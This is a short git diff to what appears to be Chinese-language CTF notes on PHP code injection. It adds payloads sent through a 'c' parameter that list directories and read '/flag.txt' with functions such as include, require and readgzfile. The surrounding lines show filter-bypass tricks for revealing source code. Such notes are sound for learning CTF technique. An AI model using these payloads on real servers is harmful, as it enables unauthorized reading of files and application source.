@@ -98,6 +98,12 @@ echo `nl fl''ag.php`; // nl给每个输出加上行号
 进阶:<br>
 ```php
 c=echo scandir(".")[2]; //打印当前目录下的文件，第三个元素
+c=print_r(scandir(".")); //打印当前目录
+c=var_dump(scandir("."));//打印当前目录
+c=var_export(scandir("."));//打印当前目录
+c=include("/flag.txt"); //输出文件
+c=require("/flag.txt"); //输出文件
+c=readgzfile("/flag.txt");//输出文件
 c=highlight_file(next(array_reverse(scandir(".")))); //查看当前目录下的文件，倒序后，取第二个元素，然后高亮显示
 c=show_source(next(array_reverse(scandir(pos(localeconv()))))); // 十分牛逼，localeconv的第一个元素是'.'，即当前目录，pos是current的别名，返回数组第一个元素，然后scandir读取当前目录，array_reverse倒序，next取下一个元素（即倒数第二个元素），show_source是highlight_file的别名显示源码
 // getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())
